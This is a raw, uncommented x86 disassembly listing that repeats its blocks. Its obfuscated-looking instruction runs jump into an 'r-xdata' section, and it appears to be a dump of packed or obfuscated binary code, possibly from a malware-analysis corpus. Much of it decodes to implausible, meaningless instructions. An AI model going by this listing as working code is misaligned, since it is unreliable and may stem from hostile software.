add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12ea
jae r-xdata
call sub_4041a2
jb 0xffffffff81b2be58
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c629
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403f8d
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd522d
add esp 0x4
jae r-xdata
jl 0xf3c36e
jae r-xdata
jmp 0xffffffffff79c0d4
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a67
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5c8
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bae3
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40401a
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2c2c6
pop ecx
jns r-xdata
jno 0xffffffff874f7579
jg r-xdata
jo 0xffffffffcbc1bedb
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fdd
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c712
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fda1
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_40401a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8b0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17e00
jge 0x71fc7f19
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_404011
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40412b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
jae r-xdata
ja 0xffffffffa3c34fd6
jae r-xdata
ja 0xffffffff89a47c77
ja r-xdata
xor ebx 0xff3d870f
call sub_403f8d
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdec5bc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79c0d4
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc293
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12ea
jae r-xdata
call sub_4041a2
jb 0xffffffff81b2be58
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c629
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd522d
add esp 0x4
jae r-xdata
jl 0xf3c36e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a67
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5c8
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bae3
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40403d
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_40413a
xor ebx 0xff1a830f
jo 0x559697a0
call sub_40412b
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fd6
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bc293
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5bc
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_4041a2
jb 0xffffffff81b2be58
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
add esp 0x4
jae r-xdata
jl 0xf3c36e
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f9a67
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428bae3
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5c8
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd12ea
jno r-xdata
jge 0xffffffffffa0c629
jge r-xdata
jpe 0x74cd522d
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404048
push esp
push edi
push esi
push ebp
call sub_40412b
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fd6
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bc293
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5bc
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_4041a2
jb 0xffffffff81b2be58
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
add esp 0x4
jae r-xdata
jl 0xf3c36e
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f9a67
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428bae3
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5c8
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd12ea
jno r-xdata
jge 0xffffffffffa0c629
jge r-xdata
jpe 0x74cd522d
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40412b
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5bc
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_4041a2
jb 0xffffffff81b2be58
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
